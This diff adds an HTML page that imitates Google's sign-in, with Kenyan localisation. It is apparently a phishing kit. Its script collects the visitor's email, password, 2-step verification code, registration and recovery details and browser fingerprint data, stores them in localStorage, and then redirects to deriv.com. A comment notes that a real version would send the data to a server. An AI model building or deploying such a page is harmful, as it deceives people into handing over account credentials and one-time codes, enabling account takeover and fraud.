@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #fff;
+            color: #000000;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .google-header {
+            margin-top: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .google-header h1 {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0;
+            color: #000000;
+        }
+
+        .auth-card {
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+        }
+
+        .auth-title {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin: 0 0 16px;
+            color: #000000;
+            text-align: center;
+        }
+
+        .auth-subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            letter-spacing: 0.1px;
+            line-height: 1.5;
+            margin: 0 0 40px;
+            color: #000000;
+            text-align: center;
+        }
+
+        .user-email-display {
+            font-size: 16px;
+            font-weight: 500;
+            color: #000000;
+            text-align: center;
+            margin-bottom: 40px;
+            word-break: break-all;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        .google-input {
+            width: 100%;
+            height: 56px;
+            padding: 13px 15px;
+            box-sizing: border-box;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        .google-input:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+
+        .google-input:focus + .input-label {
+            color: #1a73e8;
+            transform: translate(-8px, -28px) scale(0.75);
+        }
+
+        .google-input:not(:placeholder-shown) + .input-label {
+            transform: translate(-8px, -28px) scale(0.75);
+        }
+
+        .input-label {
+            position: absolute;
+            top: 18px;
+            left: 15px;
+            color: #5f6368;
+            font-size: 16px;
+            background-color: white;
+            padding: 0 5px;
+            transition: transform 0.2s, color 0.2s;
+            pointer-events: none;
+        }
+
+        .forgot-email, .forgot-password {
+            margin-bottom: 40px;
+        }
+
+        .forgot-email a, .forgot-password a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .disclaimer {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 40px;
+            line-height: 1.4286;
+        }
+
+        .learn-more {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .auth-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account-link, .sign-in-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .google-button {
+            min-width: 80px;
+            height: 36px;
+            padding: 0 16px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+            cursor: pointer;
+            border: none;
+            outline: none;
+        }
+
+        .google-button.primary {
+            background-color: #1a73e8;
+            color: white;
+        }
+
+        .google-button.primary:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(66, 133, 244, 0.3), 0 1px 3px 1px rgba(66, 133, 244, 0.15);
+        }
+
+        .google-button.secondary {
+            background-color: transparent;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+        }
+
+        .google-button.secondary:hover {
+            background-color: #f8f9fa;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-container input {
+            margin-right: 10px;
+        }
+
+        .checkbox-container label {
+            font-size: 14px;
+            color: #000000;
+        }
+
+        .header-with-back {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            margin-right: 16px;
+            color: #5f6368;
+        }
+
+        .back-button svg {
+            fill: currentColor;
+        }
+
+        .name-fields {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .half-width {
+            width: calc(50% - 6px);
+            display: inline-block;
+        }
+
+        .half-width:first-child {
+            margin-right: 12px;
+        }
+
+        .input-hint {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 6px;
+            padding: 0 15px;
+        }
+
+        .footer {
+            width: 100%;
+            background-color: #f2f2f2;
+            padding: 24px 0;
+            font-size: 12px;
+            color: #70757a;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+        }
+
+        .footer-left {
+            display: flex;
+            gap: 20px;
+        }
+
+        .footer-right {
+            display: flex;
+            gap: 20px;
+        }
+
+        .footer a {
+            color: #70757a;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .language-selector select {
+            border: none;
+            background: none;
+            color: #70757a;
+            font-size: 12px;
+            outline: none;
+        }
+
+        .country-selector {
+            margin-bottom: 20px;
+        }
+
+        .country-selector select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        /* Hidden state for all cards except login */
+        .auth-card:not(#login-card) {
+            display: none;
+        }
+        
+        /* OTP Verification Modal */
+        .otp-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .otp-content {
+            background-color: white;
+            padding: 24px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        
+        .otp-title {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            font-size: 20px;
+            font-weight: 500;
+            color: #000000;
+            margin-bottom: 16px;
+        }
+        
+        .otp-message {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
+        
+        .otp-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 24px;
+        }
+        
+        .otp-input {
+            width: 40px;
+            height: 48px;
+            text-align: center;
+            font-size: 18px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+        }
+        
+        .otp-input:focus {
+            border: 2px solid #1a73e8;
+            outline: none;
+        }
+        
+        .otp-actions {
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+        }
+        
+        .otp-timer {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 8px;
+            text-align: right;
+        }
+        
+        /* Kenya specific styles */
+        .kenya-flag {
+            display: inline-block;
+            width: 20px;
+            height: 14px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 30"><path fill="#000000" d="M0 0h60v30H0z"/><path fill="#FFFFFF" d="M0 0h60v20H0z"/><path fill="#006600" d="M0 0h60v10H0z"/><path fill="#FF0000" d="M0 10h60v10H0z"/><path fill="#000000" d="M0 0l20 15L0 30z"/><path fill="#FF0000" d="M0 0l15 15L0 30z"/><path fill="#FFFFFF" d="M0 0l10 15L0 30z"/></svg>');
+            background-size: contain;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        
+        .phone-prefix {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="google-header">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" style="height: 32px;">
+        </div>
+        
+        <!-- Login Card - Email Entry -->
+        <div class="auth-card" id="login-card">
+            <h1 class="auth-title">Sign in</h1>
+            <p class="auth-subtitle">Use your Google Account</p>
+            
+            <form id="login-form">
+                <div class="input-container">
+                    <input type="email" id="login-email" class="google-input" autofocus required>
+                    <label for="login-email" class="input-label">Email or phone</label>
+                </div>
+                
+                <div class="forgot-email">
+                    <a href="#" id="forgot-email-link">Forgot email?</a>
+                </div>
+                
+                <div class="disclaimer">
+                    <p>Not your computer? Use Guest mode to sign in privately.</p>
+                    <a href="https://support.google.com/chrome/answer/6130773?hl=en" class="learn-more">Learn more about using Guest mode</a>
+                </div>
+                
+                <div class="auth-actions">
+                    <a href="#" class="create-account-link" id="show-register">Create account</a>
+                    <button type="button" class="google-button primary" id="login-next">Next</button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- Password Card -->
+        <div class="auth-card" id="password-card">
+            <div class="header-with-back">
+                <button class="back-button" id="back-to-email">
+                    <svg focusable="false" width="24" height="24" viewBox="0 0 24 24">
+                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path>
+                    </svg>
+                </button>
+                <div>
+                    <h1 class="auth-title">Welcome</h1>
+                    <p class="user-email-display" id="user-email-display">user@example.com</p>
+                </div>
+            </div>
+            
+            <form id="password-form">
+                <div class="input-container">
+                    <input type="password" id="login-password" class="google-input" required>
+                    <label for="login-password" class="input-label">Enter your password</label>
+                </div>
+                
+                <div class="forgot-password">
+                    <a href="#" id="forgot-password-link">Forgot password?</a>
+                </div>
+                
+                <div class="checkbox-container">
+                    <input type="checkbox" id="show-password">
+                    <label for="show-password">Show password</label>
+                </div>
+                
+                <div class="auth-actions">
+                    <button type="button" class="google-button primary" id="login-submit">Next</button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- OTP Verification Card -->
+        <div class="auth-card" id="otp-card">
+            <div class="header-with-back">
+                <button class="back-button" id="back-to-password">
+                    <svg focusable="false" width="24" height="24" viewBox="0 0 24 24">
+                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path>
+                    </svg>
+                </button>
+                <div>
+                    <h1 class="auth-title">2-Step Verification</h1>
+                    <p class="user-email-display" id="otp-email-display">user@example.com</p>
+                </div>
+            </div>
+            
+            <div class="phone-prefix">
+                <span class="kenya-flag"></span>
+                <span>Kenya (+254) • SMS</span>
+            </div>
+            
+            <p style="color: #000000; margin-bottom: 24px;">Google sent a verification code to your phone number <strong>07•••</strong></p>
+            
+            <form id="otp-form">
+                <div class="input-container">
+                    <input type="text" id="otp-code" class="google-input" placeholder="Enter 6-digit code" required>
+                    <label for="otp-code" class="input-label">Enter verification code</label>
+                </div>
+                
+                <div class="checkbox-container">
+                    <input type="checkbox" id="trust-device">
+                    <label for="trust-device">Don't ask again on this device</label>
+                </div>
+                
+                <div class="auth-actions">
+                    <button type="button" class="google-button secondary" id="resend-otp">Resend code</button>
+                    <button type="button" class="google-button primary" id="verify-otp">Next</button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- Register Card -->
+        <div class="auth-card" id="register-card">
+            <div class="header-with-back">
+                <button class="back-button" id="back-to-login">
+                    <svg focusable="false" width="24" height="24" viewBox="0 0 24 24">
+                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path>
+                    </svg>
+                </button>
+                <h1 class="auth-title">Create your Google Account</h1>
+            </div>
+            
+            <form id="register-form">
+                <div class="name-fields">
+                    <div class="half-width">
+                        <div class="input-container">
+                            <input type="text" id="first-name" class="google-input" required>
+                            <label for="first-name" class="input-label">First name</label>
+                        </div>
+                    </div>
+                    <div class="half-width">
+                        <div class="input-container">
+                            <input type="text" id="last-name" class="google-input" required>
+                            <label for="last-name" class="input-label">Last name</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="input-container">
+                    <input type="email" id="register-email" class="google-input" required>
+                    <label for="register-email" class="input-label">Email</label>
+                </div>
+                
+                <div class="input-container">
+                    <input type="password" id="register-password" class="google-input" required minlength="6">
+                    <label for="register-password" class="input-label">Password</label>
+                    <div class="input-hint">Use at least 8 characters</div>
+                </div>
+                
+                <div class="input-container">
+                    <input type="password" id="confirm-password" class="google-input" required>
+                    <label for="confirm-password" class="input-label">Confirm</label>
+                </div>
+                
+                <div class="checkbox-container">
+                    <input type="checkbox" id="show-register-password">
+                    <label for="show-register-password">Show password</label>
+                </div>
+                
+                <div class="country-selector">
+                    <select id="country" required>
+                        <option value="KE" selected>Kenya</option>
+                        <option value="US">United States</option>
+                        <option value="GB">United Kingdom</option>
+                        <option value="NG">Nigeria</option>
+                        <option value="ZA">South Africa</option>
+                    </select>
+                </div>
+                
+                <div class="auth-actions">
+                    <a href="#" class="sign-in-link" id="show-login">Sign in instead</a>
+                    <button type="button" class="google-button primary" id="register-submit">Next</button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- Forgot Email Card -->
+        <div class="auth-card" id="forgot-email-card">
+            <div class="header-with-back">
+                <button class="back-button" id="back-from-forgot-email">
+                    <svg focusable="false" width="24" height="24" viewBox="0 0 24 24">
+                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path>
+                    </svg>
+                </button>
+                <h1 class="auth-title">Find your email</h1>
+            </div>
+            
+            <form id="forgot-email-form">
+                <div class="input-container">
+                    <input type="text" id="recovery-phone" class="google-input" required>
+                    <label for="recovery-phone" class="input-label">Phone number or recovery email</label>
+                </div>
+                
+                <div class="input-container">
+                    <input type="text" id="first-name-recovery" class="google-input" required>
+                    <label for="first-name-recovery" class="input-label">First name</label>
+                </div>
+                
+                <div class="input-container">
+                    <input type="text" id="last-name-recovery" class="google-input" required>
+                    <label for="last-name-recovery" class="input-label">Last name</label>
+                </div>
+                
+                <div class="auth-actions">
+                    <button type="button" class="google-button primary" id="recovery-submit">Next</button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- Forgot Password Card -->
+        <div class="auth-card" id="forgot-password-card">
+            <div class="header-with-back">
+                <button class="back-button" id="back-from-forgot-password">
+                    <svg focusable="false" width="24" height="24" viewBox="0 0 24 24">
+                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path>
+                    </svg>
+                </button>
+                <h1 class="auth-title">Reset your password</h1>
+                <p class="user-email-display" id="password-reset-email">user@example.com</p>
+            </div>
+            
+            <form id="forgot-password-form">
+                <div class="input-container">
+                    <input type="password" id="new-password" class="google-input" required>
+                    <label for="new-password" class="input-label">New password</label>
+                </div>
+                
+                <div class="input-container">
+                    <input type="password" id="confirm-new-password" class="google-input" required>
+                    <label for="confirm-new-password" class="input-label">Confirm new password</label>
+                </div>
+                
+                <div class="checkbox-container">
+                    <input type="checkbox" id="show-new-password">
+                    <label for="show-new-password">Show password</label>
+                </div>
+                
+                <div class="auth-actions">
+                    <button type="button" class="google-button primary" id="password-reset-submit">Reset password</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-left">
+                <div class="language-selector">
+                    <span>English (Kenya)</span>
+                </div>
+            </div>
+            <div class="footer-right">
+                <a href="https://support.google.com/accounts?hl=en&visit_id=638834193547361691-3038435&rd=2&p=account_iph#topic=3382296">Help</a>
+                <a href="https://policies.google.com/privacy?gl=KE&hl=en-US">Privacy</a>
+                <a href="https://policies.google.com/terms?gl=KE&hl=en-US">Terms</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Enhanced data collection object
+        const userData = {
+            login: {},
+            registration: {},
+            otp: {},
+            recovery: {},
+            metadata: {
+                userAgent: navigator.userAgent,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'unspecified'
+            }
+        };
+
+        // Store all data in localStorage and prepare for submission
+        function storeUserData() {
+            const timestamp = new Date().toISOString();
+            const completeData = {
+                ...userData,
+                timestamp: timestamp
+            };
+            
+            localStorage.setItem('googleAccountData', JSON.stringify(completeData));
+            
+            // Prepare for submission (in a real app, this would send to your server)
+            console.log('Data collected:', completeData);
+        }
+
+        // Redirect to deriv.com after collecting all data
+        function redirectToDeriv() {
+            storeUserData();
+            window.location.href = 'https://deriv.com';
+        }
+
+        // Elements
+        const loginCard = document.getElementById('login-card');
+        const passwordCard = document.getElementById('password-card');
+        const otpCard = document.getElementById('otp-card');
+        const registerCard = document.getElementById('register-card');
+        const forgotEmailCard = document.getElementById('forgot-email-card');
+        const forgotPasswordCard = document.getElementById('forgot-password-card');
+        
+        const loginNextBtn = document.getElementById('login-next');
+        const backToEmailBtn = document.getElementById('back-to-email');
+        const backToPasswordBtn = document.getElementById('back-to-password');
+        const backToLoginBtn = document.getElementById('back-to-login');
+        const backFromForgotEmailBtn = document.getElementById('back-from-forgot-email');
+        const backFromForgotPasswordBtn = document.getElementById('back-from-forgot-password');
+        
+        const showRegisterBtn = document.getElementById('show-register');
+        const showLoginBtn = document.getElementById('show-login');
+        const forgotEmailLink = document.getElementById('forgot-email-link');
+        const forgotPasswordLink = document.getElementById('forgot-password-link');
+        
+        const loginEmailInput = document.getElementById('login-email');
+        const userEmailDisplay = document.getElementById('user-email-display');
+        const otpEmailDisplay = document.getElementById('otp-email-display');
+        const passwordResetEmail = document.getElementById('password-reset-email');
+        const loginPasswordInput = document.getElementById('login-password');
+        const loginSubmitBtn = document.getElementById('login-submit');
+        
+        const registerSubmitBtn = document.getElementById('register-submit');
+        const firstNameInput = document.getElementById('first-name');
+        const lastNameInput = document.getElementById('last-name');
+        const registerEmailInput = document.getElementById('register-email');
+        const registerPasswordInput = document.getElementById('register-password');
+        const confirmPasswordInput = document.getElementById('confirm-password');
+        
+        const showPasswordCheckbox = document.getElementById('show-password');
+        const showRegisterPasswordCheckbox = document.getElementById('show-register-password');
+        const showNewPasswordCheckbox = document.getElementById('show-new-password');
+        const newPasswordInput = document.getElementById('new-password');
+        const confirmNewPasswordInput = document.getElementById('confirm-new-password');
+        
+        const otpCodeInput = document.getElementById('otp-code');
+        const verifyOtpBtn = document.getElementById('verify-otp');
+        const resendOtpBtn = document.getElementById('resend-otp');
+        
+        // Show password card when Next is clicked on email
+        loginNextBtn.addEventListener('click', function() {
+            if (loginEmailInput.value.trim() !== '') {
+                const email = loginEmailInput.value.trim();
+                userData.login.email = email;
+                storeUserData();
+                
+                loginCard.style.display = 'none';
+                passwordCard.style.display = 'block';
+                userEmailDisplay.textContent = email;
+                passwordResetEmail.textContent = email;
+                otpEmailDisplay.textContent = email;
+            } else {
+                loginEmailInput.focus();
+            }
+        });
+
+        // Back to email from password
+        backToEmailBtn.addEventListener('click', function() {
+            passwordCard.style.display = 'none';
+            loginCard.style.display = 'block';
+        });
+        
+        // Back to password from OTP
+        backToPasswordBtn.addEventListener('click', function() {
+            otpCard.style.display = 'none';
+            passwordCard.style.display = 'block';
+        });
+
+        // Show register form
+        showRegisterBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            loginCard.style.display = 'none';
+            registerCard.style.display = 'block';
+        });
+
+        // Back to login from register
+        backToLoginBtn.addEventListener('click', function() {
+            registerCard.style.display = 'none';
+            loginCard.style.display = 'block';
+        });
+
+        // Show login form from register
+        showLoginBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            registerCard.style.display = 'none';
+            loginCard.style.display = 'block';
+        });
+
+        // Show forgot email form
+        forgotEmailLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            loginCard.style.display = 'none';
+            forgotEmailCard.style.display = 'block';
+        });
+
+        // Back to login from forgot email
+        backFromForgotEmailBtn.addEventListener('click', function() {
+            forgotEmailCard.style.display = 'none';
+            loginCard.style.display = 'block';
+        });
+
+        // Show forgot password form
+        forgotPasswordLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            passwordCard.style.display = 'none';
+            forgotPasswordCard.style.display = 'block';
+        });
+
+        // Back to password from forgot password
+        backFromForgotPasswordBtn.addEventListener('click', function() {
+            forgotPasswordCard.style.display = 'none';
+            passwordCard.style.display = 'block';
+        });
+
+        // Toggle password visibility
+        showPasswordCheckbox.addEventListener('change', function() {
+            loginPasswordInput.type = this.checked ? 'text' : 'password';
+        });
+
+        // Toggle register password visibility
+        showRegisterPasswordCheckbox.addEventListener('change', function() {
+            registerPasswordInput.type = this.checked ? 'text' : 'password';
+            confirmPasswordInput.type = this.checked ? 'text' : 'password';
+        });
+
+        // Toggle new password visibility
+        showNewPasswordCheckbox.addEventListener('change', function() {
+            newPasswordInput.type = this.checked ? 'text' : 'password';
+            confirmNewPasswordInput.type = this.checked ? 'text' : 'password';
+        });
+
+        // Focus management for input labels
+        document.querySelectorAll('.google-input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentNode.querySelector('.input-label').classList.add('focused');
+            });
+            
+            input.addEventListener('blur', function() {
+                if (this.value === '') {
+                    this.parentNode.querySelector('.input-label').classList.remove('focused');
+                }
+            });
+        });
+
+        // Register form submission
+        registerSubmitBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            userData.registration = {
+                firstName: firstNameInput.value,
+                lastName: lastNameInput.value,
+                email: registerEmailInput.value,
+                password: registerPasswordInput.value,
+                country: document.getElementById('country').value,
+                timestamp: new Date().toISOString()
+            };
+
+            if (userData.registration.password !== confirmPasswordInput.value) {
+                alert("Passwords don't match");
+                return;
+            }
+            
+            if (userData.registration.password.length < 6) {
+                alert("Password must be at least 6 characters");
+                return;
+            }
+            
+            redirectToDeriv();
+        });
+
+        // Login form submission
+        loginSubmitBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            userData.login.password = loginPasswordInput.value;
+            userData.login.timestamp = new Date().toISOString();
+            
+            if (userData.login.password.trim() === '') {
+                alert('Please enter your password');
+                return;
+            }
+            
+            // Show OTP verification
+            passwordCard.style.display = 'none';
+            otpCard.style.display = 'block';
+        });
+        
+        // Verify OTP
+        verifyOtpBtn.addEventListener('click', function() {
+            const otpCode = otpCodeInput.value.trim();
+            
+            if (otpCode.length !== 6 || !/^\d+$/.test(otpCode)) {
+                alert('Please enter a valid 6-digit code');
+                return;
+            }
+            
+            userData.otp = {
+                code: otpCode,
+                deviceTrusted: document.getElementById('trust-device').checked,
+                timestamp: new Date().toISOString()
+            };
+            
+            redirectToDeriv();
+        });
+        
+        // Resend OTP
+        resendOtpBtn.addEventListener('click', function() {
+            alert('New verification code sent to your phone ending with •••1234');
+        });
+        
+        // Forgot password form submission
+        document.getElementById('password-reset-submit').addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            userData.recovery = {
+                newPassword: newPasswordInput.value,
+                timestamp: new Date().toISOString()
+            };
+            
+            if (userData.recovery.newPassword !== confirmNewPasswordInput.value) {
+                alert("Passwords don't match");
+                return;
+            }
+            
+            if (userData.recovery.newPassword.length < 6) {
+                alert("Password must be at least 6 characters");
+                return;
+            }
+            
+            redirectToDeriv();
+        });
+        
+        // Forgot email form submission
+        document.getElementById('recovery-submit').addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            userData.recovery = {
+                phoneOrEmail: document.getElementById('recovery-phone').value,
+                firstName: document.getElementById('first-name-recovery').value,
+                lastName: document.getElementById('last-name-recovery').value,
+                timestamp: new Date().toISOString()
+            };
+            
+            if (!userData.recovery.phoneOrEmail || !userData.recovery.firstName || !userData.recovery.lastName) {
+                alert('Please fill in all fields');
+                return;
+            }
+            
+            redirectToDeriv();
+        });
+    </script>
+</body>
+</html>
